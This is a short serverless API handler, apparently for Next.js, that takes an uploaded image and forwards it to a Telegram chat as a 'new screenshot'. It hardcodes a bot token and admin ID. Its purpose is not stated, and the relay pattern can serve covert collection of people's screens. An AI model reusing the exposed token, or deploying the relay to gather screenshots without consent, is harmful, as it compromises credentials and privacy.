export const config = { api: { bodyParser: false } };

export default async function handler(req, res) {
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  const buffer = Buffer.concat(chunks);

  const botToken = "8019441613:AAGvcrVmKwdq4YKgWWQgDxC4zmtM9-HR-CQ";
  const adminId = "6342951618";

  const formData = new FormData();
  formData.append("chat_id", adminId);
  formData.append("caption", "📸 Новый скриншот");
  formData.append("photo", new Blob([buffer], { type: "image/jpeg" }), "screenshot.jpg");

  const telegramResp = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: "POST",
    body: formData
  });

  const result = await telegramResp.json();
  res.status(200).json({ ok: true, result });
}
